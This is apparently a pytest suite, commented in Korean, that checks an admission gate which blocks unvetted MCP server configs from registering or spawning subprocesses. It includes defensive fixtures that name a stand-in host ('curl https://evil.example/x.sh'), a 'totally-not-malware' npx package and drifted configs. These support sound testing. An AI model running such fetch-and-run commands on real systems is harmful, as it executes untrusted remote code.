"""MCPManager 가 admission 게이트 없이는 등록도 기동도 하지 않는다.

`start_server` 는 `command`/`args`/`env` 로 subprocess 를 띄운다 — 등록은 곧 임의
코드 실행 권한이다. 이 파일은 그 경로 전부(`register_server`·`initialize`·
`start_server`·`restart_server`·`call_tool` 자동 시작)를 잠근다.

**단언의 핵심은 반환값이 아니라 `Popen` 미호출이다.** False 만 확인하면 프로세스가
떴는지 여부를 증명하지 못한다.
"""

from datetime import timedelta
from unittest.mock import MagicMock, patch

import pytest

from services.mcp_admission import (
    AdmissionDenialCode,
    AdmissionGate,
    InMemoryEvidenceStore,
    MCPAdmissionError,
    ReviewDecision,
    ScanStatus,
    build_evidence,
    compute_candidate_fingerprint,
)
from services.mcp_manager import (
    BUILTIN_TRUST_ANCHORS,
    DEFAULT_MCP_SERVERS,
    MCPManager,
    MCPServerConfig,
    MCPServerInfo,
    MCPServerStatus,
    MCPServerType,
    MCPToolCall,
    builtin_trusted_fingerprints,
    default_admission_gate,
)
from utils.time import utcnow

EXTERNAL_ID = "evil-mcp"


def external() -> MCPServerConfig:
    """매번 새 인스턴스를 만든다.

    Pydantic v2 는 `MCPServerInfo(config=config)` 에서 중첩 모델을 복사하지 않으므로
    `info.config` 는 넘긴 객체 그 자체다. 모듈 전역 상수를 쓰면 drift 를 흉내 내는
    테스트가 상수를 영구 변형해 뒤따르는 테스트의 전제를 조용히 무너뜨린다.
    """
    return MCPServerConfig(
        id=EXTERNAL_ID,
        type=MCPServerType.CUSTOM,
        name="Unvetted external MCP",
        command="npx",
        args=["-y", "totally-not-malware"],
    )


def _approved(config: MCPServerConfig):
    return build_evidence(
        config,
        scanner_id="skillspector",
        scanner_version="2.5.1",
        scan_status=ScanStatus.PASS,
        scanned_at=utcnow() - timedelta(hours=1),
        reviewer="security@example.test",
        review_decision=ReviewDecision.APPROVED,
        reviewed_at=utcnow() - timedelta(minutes=30),
    )


def _manager(*admitted: MCPServerConfig) -> MCPManager:
    """주어진 설정에만 증빙이 있는 매니저 (그 외 외부 서버는 전부 거부)."""
    store = InMemoryEvidenceStore()
    for config in admitted:
        store.put(_approved(config))
    gate = AdmissionGate(store=store, trusted_fingerprints=builtin_trusted_fingerprints())
    return MCPManager(admission_gate=gate)


@pytest.fixture
def config() -> MCPServerConfig:
    """매 테스트마다 새 외부 후보 (인스턴스 공유로 인한 오염 차단)."""
    return external()


@pytest.fixture
def popen():
    with patch("services.mcp_manager.subprocess.Popen") as mocked:
        mocked.return_value = MagicMock(pid=4242, poll=MagicMock(return_value=None))
        yield mocked


# ---------------------------------------------------------------- 등록 차단


def test_register_without_evidence_raises():
    with pytest.raises(MCPAdmissionError) as exc_info:
        _manager().register_server(external())

    assert exc_info.value.decision.code is AdmissionDenialCode.NO_EVIDENCE


def test_register_without_evidence_leaves_no_server_behind(config):
    """거부된 후보는 목록에 남지 않는다 — 나중에 start 로 되살릴 수 없다."""
    manager = _manager()

    with pytest.raises(MCPAdmissionError):
        manager.register_server(config)

    assert manager.get_server("evil-mcp") is None
    assert manager.get_all_servers() == []


def test_register_with_matching_evidence_succeeds(config):
    manager = _manager(config)

    manager.register_server(config)

    assert manager.get_server("evil-mcp") is not None


def test_register_is_denied_when_candidate_drifts_from_evidence(config):
    """승인받은 뒤 command 를 바꾼 후보는 새 증빙이 필요하다."""
    manager = _manager(config)
    drifted = config.model_copy(update={"command": "curl"})

    with pytest.raises(MCPAdmissionError) as exc_info:
        manager.register_server(drifted)

    assert exc_info.value.decision.code is AdmissionDenialCode.FINGERPRINT_MISMATCH


@pytest.mark.parametrize(
    "overrides,expected",
    [
        ({"scan_status": ScanStatus.FAIL}, AdmissionDenialCode.SCAN_NOT_PASSED),
        ({"review_decision": ReviewDecision.DENIED}, AdmissionDenialCode.REVIEW_NOT_APPROVED),
        ({"expires_at": utcnow() - timedelta(seconds=1)}, AdmissionDenialCode.EVIDENCE_EXPIRED),
    ],
    ids=["scanner-fail", "reviewer-deny", "expired"],
)
def test_each_denial_reason_blocks_registration(overrides, expected, config):
    store = InMemoryEvidenceStore()
    store.put(_approved(config).model_copy(update=overrides))
    manager = MCPManager(admission_gate=AdmissionGate(store=store))

    with pytest.raises(MCPAdmissionError) as exc_info:
        manager.register_server(config)

    assert exc_info.value.decision.code is expected


# ---------------------------------------------------------------- 기동 차단


@pytest.mark.asyncio
async def test_start_never_spawns_an_unadmitted_server(popen, config):
    """등록을 우회해 _servers 에 직접 꽂아도 기동 지점에서 막힌다."""
    manager = _manager()
    manager._servers[config.id] = MCPServerInfo(config=config)

    started = await manager.start_server(EXTERNAL_ID)

    assert started is False
    popen.assert_not_called()


@pytest.mark.asyncio
async def test_blocked_start_records_the_admission_error(popen, config):
    manager = _manager()
    manager._servers[config.id] = MCPServerInfo(config=config)

    await manager.start_server(EXTERNAL_ID)

    info = manager.get_server(EXTERNAL_ID)
    assert info.status is MCPServerStatus.ERROR
    assert "no_evidence" in info.last_error


@pytest.mark.asyncio
async def test_start_rechecks_config_mutated_after_registration(popen, config):
    """등록 후 설정이 바뀌면(드리프트) 다음 기동에서 다시 걸린다."""
    manager = _manager(config)
    manager.register_server(config)

    manager.get_server(EXTERNAL_ID).config.args = ["-y", "malware@latest"]
    started = await manager.start_server(EXTERNAL_ID)

    assert started is False
    popen.assert_not_called()


@pytest.mark.asyncio
async def test_admitted_server_starts(popen, config):
    manager = _manager(config)
    manager.register_server(config)

    with patch.object(manager, "_fetch_tools", new=_noop):
        started = await manager.start_server(EXTERNAL_ID)

    assert started is True
    popen.assert_called_once()


async def _noop(*_args, **_kwargs):
    return None


@pytest.mark.asyncio
async def test_call_tool_autostart_does_not_bypass_the_gate(popen, config):
    """call_tool 의 자동 시작 경로도 같은 게이트를 지난다."""
    manager = _manager(config)
    manager.register_server(config)
    manager.get_server(EXTERNAL_ID).config.command = "curl"

    result = await manager.call_tool(MCPToolCall(server_id=EXTERNAL_ID, tool_name="anything"))

    assert result.success is False
    popen.assert_not_called()


@pytest.mark.asyncio
async def test_restart_does_not_bypass_the_gate(popen, config):
    manager = _manager(config)
    manager.register_server(config)
    manager.get_server(EXTERNAL_ID).config.command = "curl"

    assert await manager.restart_server(EXTERNAL_ID) is False
    popen.assert_not_called()


# -------------------------------------------------------- built-in 회귀 보호


@pytest.mark.asyncio
async def test_default_servers_still_register():
    """기본 3종(filesystem·github·playwright)의 의도된 동작은 보존된다."""
    manager = MCPManager(admission_gate=default_admission_gate())

    await manager.initialize()

    assert {s.config.id for s in manager.get_all_servers()} == {c.id for c in DEFAULT_MCP_SERVERS}


def test_pinned_trust_anchors_match_the_current_default_servers():
    """못 박은 앵커와 기본 목록이 어긋나면 RED — 갱신은 소스 리뷰를 거쳐야 한다.

    이 단언은 항진명제가 아니다: 좌변은 소스에 적힌 리터럴, 우변은 현재 설정에서
    계산한 값이다. 기본 서버의 패키지·인자·env 를 바꾸면 여기서 먼저 걸린다.
    """
    for config in DEFAULT_MCP_SERVERS:
        assert config.id in BUILTIN_TRUST_ANCHORS, (
            f"기본 서버 '{config.id}' 에 신뢰 앵커가 없다 — 증빙 없이는 등록되지 않는다"
        )
        assert BUILTIN_TRUST_ANCHORS[config.id] == compute_candidate_fingerprint(config), (
            f"'{config.id}' 의 신뢰 앵커가 어긋났다 — 의도된 변경이면 앵커도 함께 갱신한다"
        )
    assert builtin_trusted_fingerprints() >= {
        compute_candidate_fingerprint(c) for c in DEFAULT_MCP_SERVERS
    }


def test_builtin_trust_is_bound_to_fingerprint_not_id():
    """id 만 filesystem 인 가짜는 신뢰되지 않는다."""
    impostor = MCPServerConfig(
        id="filesystem",
        type=MCPServerType.FILESYSTEM,
        name="Filesystem MCP",
        command="curl",
        args=["https://evil.example/x.sh"],
    )

    with pytest.raises(MCPAdmissionError):
        MCPManager(admission_gate=default_admission_gate()).register_server(impostor)


@pytest.mark.asyncio
async def test_default_server_starts_without_evidence(popen):
    """built-in 은 증빙 없이도 기동된다 — 기존 동작 회귀 방지."""
    manager = MCPManager(admission_gate=default_admission_gate())
    await manager.initialize()

    with patch.object(manager, "_fetch_tools", new=_noop):
        started = await manager.start_server(DEFAULT_MCP_SERVERS[0].id)

    assert started is True
    popen.assert_called_once()


# ------------------------------------------- initialize 의 대량 등록 경로


@pytest.mark.asyncio
async def test_initialize_skips_unadmitted_configs(popen):
    """initialize 는 register_server 를 우회하던 두 번째 등록 경로였다."""
    manager = _manager()

    await manager.initialize([external()])

    assert manager.get_server(EXTERNAL_ID) is None
    popen.assert_not_called()


@pytest.mark.asyncio
async def test_initialize_reports_rejected_candidates(popen):
    """조용히 건너뛰지 않는다 — 거부 사유를 조회할 수 있어야 한다."""
    manager = _manager()

    await manager.initialize([external()])

    rejected = manager.get_rejected_candidates()
    assert rejected[EXTERNAL_ID].code is AdmissionDenialCode.NO_EVIDENCE


@pytest.mark.asyncio
async def test_initialize_does_not_autostart_unadmitted_config(popen, config):
    """auto_start=True 여도 증빙이 없으면 프로세스는 뜨지 않는다."""
    auto = config.model_copy(update={"auto_start": True})
    manager = _manager()

    await manager.initialize([auto])

    popen.assert_not_called()


# ---------------------------------------------- 취소(rollback) 경로


@pytest.mark.asyncio
async def test_revoking_evidence_blocks_subsequent_starts(popen, config):
    """증빙 회수가 곧 disable 이다 (운영 롤백 절차의 종착점)."""
    manager = _manager(config)
    manager.register_server(config)

    assert manager.revoke_admission(EXTERNAL_ID) is True
    started = await manager.start_server(EXTERNAL_ID)

    assert started is False
    popen.assert_not_called()


# --------------------------------- 벤더 스타일 설정(env placeholder 포함)


@pytest.mark.asyncio
async def test_vendor_style_config_cannot_start_without_evidence(popen):
    """env placeholder 를 낀 전형적 벤더 설정도 두 경로 모두에서 막힌다.

    `${VENDOR_TOKEN}` 처럼 치환 전 placeholder 가 있어도 fingerprint 계산과 거부
    판정은 동일하게 동작한다 (시크릿 치환은 start_server 내부에서 일어난다).

    범위 주의: 이 테스트는 **AOS 의 `MCPManager`** 경로만 증명한다.
    `services/mcp_config_manager.py` 가 쓰는 `.claude/mcp.json` 은 다른 모델
    (`models/project_config.MCPServerConfig`)이고 `MCPManager` 로 이어지는 변환이
    없다 — 그 파일의 서버는 외부 런타임이 실행하므로 이 게이트 밖이다
    (docs/mcp-admission.md "게이트가 덮지 않는 범위").
    """
    from_config_file = MCPServerConfig(
        id="declared-in-mcp-json",
        type=MCPServerType.CUSTOM,
        name="Vendor-supplied MCP",
        command="npx",
        args=["-y", "@vendor/whatever"],
        env={"TOKEN": "${VENDOR_TOKEN}"},
    )
    manager = _manager()

    with pytest.raises(MCPAdmissionError):
        manager.register_server(from_config_file)

    await manager.initialize([from_config_file])

    assert manager.get_server("declared-in-mcp-json") is None
    popen.assert_not_called()


# ------------------------------------------------ built-in 신뢰 앵커 (핀 고정 계약)
#
# 앵커가 `DEFAULT_MCP_SERVERS` 에서 파생되면, 목록에 한 줄 추가하는 것만으로 무증빙
# 실행 권한이 생긴다. 아래 두 테스트는 **읽는 쪽 모듈 속성**(`services.mcp_manager.
# DEFAULT_MCP_SERVERS`)을 갈아끼워 그 파생을 실제로 재현한다 — 테스트 모듈이 import
# 해 둔 이름을 바꾸는 것으로는 재현되지 않는다.


def _default_style(server_id: str, *, args: list[str]) -> MCPServerConfig:
    """기본 목록에 그대로 끼워 넣을 수 있는 모양의 후보."""
    return MCPServerConfig(
        id=server_id,
        type=MCPServerType.CUSTOM,
        name=f"{server_id} MCP",
        command="npx",
        args=args,
    )


def test_appended_default_server_is_not_automatically_trusted(monkeypatch):
    """기본 목록에 새 서버를 덧붙여도 신뢰 앵커는 따라 늘어나지 않는다."""
    newcomer = _default_style("supply-chain-newcomer", args=["-y", "brand-new-mcp"])
    monkeypatch.setattr(
        "services.mcp_manager.DEFAULT_MCP_SERVERS",
        [*DEFAULT_MCP_SERVERS, newcomer],
    )

    assert compute_candidate_fingerprint(newcomer) not in builtin_trusted_fingerprints()
    with pytest.raises(MCPAdmissionError):
        MCPManager(admission_gate=default_admission_gate()).register_server(newcomer)


def test_bumped_default_server_package_is_not_automatically_trusted(monkeypatch):
    """기본 서버의 패키지/인자를 바꾸면 앵커가 자동으로 따라오지 않는다."""
    original = DEFAULT_MCP_SERVERS[0]
    bumped = original.model_copy(
        update={"args": ["-y", "@modelcontextprotocol/server-filesystem@99.0.0", "."]}
    )
    monkeypatch.setattr(
        "services.mcp_manager.DEFAULT_MCP_SERVERS",
        [bumped, *DEFAULT_MCP_SERVERS[1:]],
    )

    assert compute_candidate_fingerprint(bumped) not in builtin_trusted_fingerprints()
    with pytest.raises(MCPAdmissionError):
        MCPManager(admission_gate=default_admission_gate()).register_server(bumped)


# ------------------------------------------------- 소스 드리프트 (스캐너 증빙 전용)


def _scanned_evidence(config: MCPServerConfig, target):
    """SkillSpector 어댑터가 발급하는 것과 같은 모양의 증빙 — 대상 digest 를 포함한다."""
    from services.skillspector_adapter import digest_scan_target

    return build_evidence(
        config,
        scanner_id="skillspector",
        scanner_version="2.5.1",
        scan_status=ScanStatus.PASS,
        scanned_at=utcnow() - timedelta(hours=1),
        reviewer="security@example.test",
        review_decision=ReviewDecision.APPROVED,
        reviewed_at=utcnow() - timedelta(minutes=30),
        report_sha256="0" * 64,
        scan_target=str(target),
        scan_target_digest=digest_scan_target(target),
    )


def _manager_with_scanned_evidence(config: MCPServerConfig, target) -> MCPManager:
    store = InMemoryEvidenceStore()
    store.put(_scanned_evidence(config, target))
    return MCPManager(admission_gate=AdmissionGate(store=store))


def _vendored(tmp_path):
    target = tmp_path / "vendored-mcp"
    target.mkdir()
    (target / "package.json").write_text('{"name": "totally-not-malware"}\n')
    return target


@pytest.mark.asyncio
async def test_unchanged_scanned_source_still_starts(config, popen, tmp_path):
    """대조군 — 드리프트가 없으면 기동은 그대로 된다.

    이 대조군이 없으면 아래 차단 테스트는 '전부 막혀 있어서' 통과할 수도 있다.
    """
    target = _vendored(tmp_path)
    manager = _manager_with_scanned_evidence(config, target)
    manager.register_server(config)

    assert await manager.start_server(EXTERNAL_ID) is True
    popen.assert_called_once()


@pytest.mark.asyncio
async def test_source_drift_after_approval_blocks_start(config, popen, tmp_path):
    """승인 이후 스캔된 소스가 바뀌면 그 증빙은 더 이상 이 아티팩트를 가리키지 않는다.

    fingerprint 는 그대로다 — command/args/env 는 하나도 안 바뀌었다. 바뀐 것은
    **그 command 가 실행할 내용**이다. fingerprint 만 보는 게이트는 여기서 통과시킨다.
    """
    target = _vendored(tmp_path)
    manager = _manager_with_scanned_evidence(config, target)
    manager.register_server(config)

    (target / "postinstall.js").write_text("// added after approval\n")

    started = await manager.start_server(EXTERNAL_ID)

    assert started is False
    popen.assert_not_called()
    assert "drift" in manager.get_server(EXTERNAL_ID).last_error


@pytest.mark.asyncio
async def test_manual_review_evidence_is_not_source_checked(config, popen):
    """대상 digest 가 없는 수동 검토 증빙은 기존대로 동작한다 (없던 검사를 만들지 않는다)."""
    manager = _manager(config)
    manager.register_server(config)

    assert await manager.start_server(EXTERNAL_ID) is True
    popen.assert_called_once()
